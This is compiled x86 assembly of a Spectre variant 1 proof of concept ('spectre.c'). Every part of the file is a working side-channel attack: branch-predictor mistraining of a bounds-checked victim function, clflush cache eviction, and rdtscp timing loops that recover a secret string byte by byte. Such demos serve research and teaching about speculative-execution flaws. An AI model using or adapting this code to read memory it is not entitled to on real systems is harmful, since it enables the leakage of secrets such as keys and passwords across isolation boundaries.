	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	call	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	xor	eax, eax
	cmp	ecx, dword ptr [esp + 4]
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	edx, dword ptr [esp + 20]
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	cmp	ecx, edx
	jbe	.LBB1_11
# %bb.1:
	mov	esi, edx
	add	esi, -1
	js	.LBB1_11
# %bb.2:
	mov	cl, byte ptr [eax + temp@GOTOFF]
	and	edx, 3
	je	.LBB1_3
# %bb.4:
	xor	edi, edi
	lea	ebx, [eax + array1@GOTOFF]
	.p2align	4, 0x90
.LBB1_5:                                # =>This Inner Loop Header: Depth=1
	movzx	ebp, byte ptr [ebx + esi]
	shl	ebp, 9
	and	cl, byte ptr [eax + ebp + array2@GOTOFF]
	add	edi, 1
	add	ebx, -1
	cmp	edx, edi
	jne	.LBB1_5
# %bb.6:
	mov	edx, esi
	sub	edx, edi
	cmp	esi, 3
	jae	.LBB1_8
	jmp	.LBB1_10
.LBB1_3:
	mov	edx, esi
	cmp	esi, 3
	jb	.LBB1_10
.LBB1_8:
	lea	esi, [eax + edx]
	add	esi, offset array1@GOTOFF
	add	edx, 4
	.p2align	4, 0x90
.LBB1_9:                                # =>This Inner Loop Header: Depth=1
	movzx	edi, byte ptr [esi]
	shl	edi, 9
	and	cl, byte ptr [eax + edi + array2@GOTOFF]
	movzx	edi, byte ptr [esi - 1]
	shl	edi, 9
	and	cl, byte ptr [eax + edi + array2@GOTOFF]
	movzx	edi, byte ptr [esi - 2]
	shl	edi, 9
	and	cl, byte ptr [eax + edi + array2@GOTOFF]
	movzx	edi, byte ptr [esi - 3]
	shl	edi, 9
	and	cl, byte ptr [eax + edi + array2@GOTOFF]
	add	edx, -4
	add	esi, -4
	cmp	edx, 3
	jg	.LBB1_9
.LBB1_10:
	mov	byte ptr [eax + temp@GOTOFF], cl
.LBB1_11:
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 28
	.cfi_def_cfa_offset 48
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	pop	edi
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	add	edi, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [edi + results@GOTOFF]
	mov	ebx, edi
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 12], 999       # 4-byte Folded Spill
	jmp	.LBB2_1
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
	lea	eax, [edx - 1]
	cmp	edx, 1
	mov	dword ptr [esp + 12], eax       # 4-byte Spill
	jbe	.LBB2_12
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_7 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [edi + eax + array2@GOTOFF]
	clflush	byte ptr [edi + eax + array2@GOTOFF+512]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1024]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1536]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2048]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2560]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3072]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	mov	esi, edx
	mov	dword ptr [esp + 16], edx       # 4-byte Spill
	xor	esi, dword ptr [esp + 48]
	mov	ebp, 29
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	mov	eax, ebp
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, ebp
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, esi
	xor	eax, dword ptr [esp + 16]       # 4-byte Folded Reload
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	ebp, 1
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	clflush	byte ptr [edi + array1_size@GOTOFF]
	mov	dword ptr [esp + 20], 0
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 99
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [esp + 20], 1
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 100
	jl	.LBB2_13
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	mov	ebx, 13
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzx	esi, bl
	mov	eax, esi
	mov	dword ptr [esp + 24], esi       # 4-byte Spill
	shl	esi, 9
	rdtscp
	mov	ebp, eax
	mov	dword ptr [esp + 16], edx       # 4-byte Spill
	movzx	eax, byte ptr [edi + esi + array2@GOTOFF]
	rdtscp
	sub	eax, ebp
	sbb	edx, dword ptr [esp + 16]       # 4-byte Folded Reload
	mov	esi, 50
	cmp	esi, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	cmp	bl, byte ptr [edi + edx + array1@GOTOFF]
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	add	dword ptr [edi + 4*eax + results@GOTOFF], 1
	jmp	.LBB2_10
.LBB2_12:
	xor	dword ptr [edi + results@GOTOFF], ecx
	add	esp, 28
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 60
	.cfi_def_cfa_offset 80
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	pop	esi
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	add	esi, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	mov	edi, dword ptr [esi + stdin@GOT]
	lea	eax, [esi + check@GOTOFF]
	mov	dword ptr [esp + 44], eax       # 4-byte Spill
	lea	eax, [esi + .L.str.9@GOTOFF]
	mov	dword ptr [esp + 40], eax       # 4-byte Spill
	lea	eax, [esi + .L.str.1@GOTOFF]
	mov	dword ptr [esp + 36], eax       # 4-byte Spill
	lea	eax, [esi + array1@GOTOFF]
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	lea	eax, [esi + array2@GOTOFF]
	mov	dword ptr [esp + 32], eax       # 4-byte Spill
	lea	eax, [esi + .L.str.2@GOTOFF]
	mov	dword ptr [esp + 28], eax       # 4-byte Spill
	mov	dword ptr [esp + 4], esi        # 4-byte Spill
	mov	dword ptr [esp + 48], edi       # 4-byte Spill
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	mov	ebx, esi
	call	getpid@PLT
	xor	ecx, ecx
	mov	edx, dword ptr [esp + 44]       # 4-byte Reload
	add	edx, 33
	setb	cl
	push	eax
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 52]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, esi
	push	dword ptr [edi]
	.cfi_adjust_cfa_offset 4
	call	getc@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_28
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_29
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [esi + secret@GOTOFF]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	mov	ebx, esi
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 48]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esi + secret@GOTOFF]
	mov	ecx, eax
	sub	ecx, dword ptr [esp + 24]       # 4-byte Folded Reload
	mov	dword ptr [esp + 8], ecx
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	strlen@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, eax
	mov	dword ptr [esp], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	131072
	.cfi_adjust_cfa_offset 4
	push	1
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 44]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	cmp	dword ptr [esp + 80], 3
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	mov	ebx, esi
	lea	eax, [esp + 12]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 36]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	mov	edi, dword ptr [esp + 96]
	push	dword ptr [edi + 4]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	sub	dword ptr [esp + 8], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esi + .L.str.3@GOTOFF]
	lea	ecx, [esp + 4]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [edi + 8]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	lea	eax, [esi + .L.str.4@GOTOFF]
	push	dword ptr [esp + 4]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 16]
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, dword ptr [esp]
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [esi + .L.str.5@GOTOFF]
	mov	ebx, esi
	push	edi
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp], ecx
	test	eax, eax
	jle	.LBB3_27
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xor	edi, edi
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_26:                               #   in Loop: Header=BB3_8 Depth=2
	mov	edi, dword ptr [esp + 52]       # 4-byte Reload
	add	edi, 1
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, esi
	push	10
	.cfi_adjust_cfa_offset 4
	call	putchar@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp], ecx
	test	eax, eax
	jle	.LBB3_27
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	mov	eax, dword ptr [esi + secret@GOTOFF]
	mov	dword ptr [esp + 52], edi       # 4-byte Spill
	movsx	eax, byte ptr [eax + edi]
	lea	ecx, [esi + .L.str.6@GOTOFF]
	mov	ebx, esi
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 16]
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 8]
	mov	dword ptr [esp + 56], eax       # 4-byte Spill
	add	eax, 1
	mov	dword ptr [esp + 8], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esi + results@GOTOFF]
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 12], 999       # 4-byte Folded Spill
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=3
	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
	lea	eax, [edx - 1]
	cmp	edx, 1
	mov	dword ptr [esp + 12], eax       # 4-byte Spill
	jbe	.LBB3_20
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
	xor	eax, eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	byte ptr [esi + eax + array2@GOTOFF]
	clflush	byte ptr [esi + eax + array2@GOTOFF+512]
	clflush	byte ptr [esi + eax + array2@GOTOFF+1024]
	clflush	byte ptr [esi + eax + array2@GOTOFF+1536]
	clflush	byte ptr [esi + eax + array2@GOTOFF+2048]
	clflush	byte ptr [esi + eax + array2@GOTOFF+2560]
	clflush	byte ptr [esi + eax + array2@GOTOFF+3072]
	clflush	byte ptr [esi + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [esi + array1_size@GOTOFF]
	mov	edi, edx
	mov	dword ptr [esp + 16], edx       # 4-byte Spill
	xor	edi, dword ptr [esp + 56]       # 4-byte Folded Reload
	mov	ebp, 29
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	mov	eax, ebp
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, ebp
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, edi
	xor	eax, dword ptr [esp + 16]       # 4-byte Folded Reload
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, esi
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	ebp, 1
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_30 Depth 5
	clflush	byte ptr [esi + array1_size@GOTOFF]
	mov	dword ptr [esp + 20], 0
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 99
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_30:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	add	dword ptr [esp + 20], 1
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 100
	jl	.LBB3_30
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	mov	ebx, 13
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_15 Depth=4
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB3_19
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movzx	esi, bl
	mov	eax, esi
	mov	dword ptr [esp + 16], esi       # 4-byte Spill
	shl	esi, 9
	rdtscp
	mov	edi, eax
	mov	ebp, edx
	mov	eax, dword ptr [esp + 4]        # 4-byte Reload
	movzx	eax, byte ptr [eax + esi + array2@GOTOFF]
	mov	esi, dword ptr [esp + 4]        # 4-byte Reload
	rdtscp
	sub	eax, edi
	sbb	edx, ebp
	mov	edi, 50
	cmp	edi, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [esi + array1_size@GOTOFF]
	cmp	bl, byte ptr [esi + edx + array1@GOTOFF]
	je	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	mov	eax, dword ptr [esp + 16]       # 4-byte Reload
	add	dword ptr [esi + 4*eax + results@GOTOFF], 1
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_8 Depth=2
	xor	ecx, dword ptr [esi + results@GOTOFF]
	mov	dword ptr [esi + results@GOTOFF], ecx
	mov	ebp, 1
	lea	edi, [esi + results@GOTOFF+4]
	mov	eax, ecx
	sub	eax, dword ptr [edi]
	jle	.LBB3_24
	.p2align	4, 0x90
.LBB3_22:                               #   in Loop: Header=BB3_8 Depth=2
	cmp	eax, 101
	jl	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_8 Depth=2
	lea	eax, [ebp - 1]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	mov	edx, dword ptr [esp + 8]        # 4-byte Reload
	lea	esi, [edx + .L.str.7@GOTOFF]
	mov	ebx, dword ptr [esp + 8]        # 4-byte Reload
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	esi
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	mov	ebx, dword ptr [esp + 8]        # 4-byte Reload
	push	dword ptr [edi]
	.cfi_adjust_cfa_offset 4
	push	ebp
	.cfi_adjust_cfa_offset 4
	push	esi
	mov	esi, dword ptr [esp + 20]       # 4-byte Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB3_24:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	cmp	ebp, 255
	je	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_24 Depth=3
	mov	ecx, dword ptr [edi]
	add	edi, 4
	add	ebp, 1
	mov	eax, ecx
	sub	eax, dword ptr [edi]
	jg	.LBB3_22
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	mov	edi, dword ptr [esp + 48]       # 4-byte Reload
	jmp	.LBB3_1
.LBB3_29:
	xor	eax, eax
	add	esp, 60
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	results,@object                 # @results
	.local	results
	.comm	results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.size	.L.str.6, 55

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"result[%d]=%d "
	.size	.L.str.7, 15

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.9, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
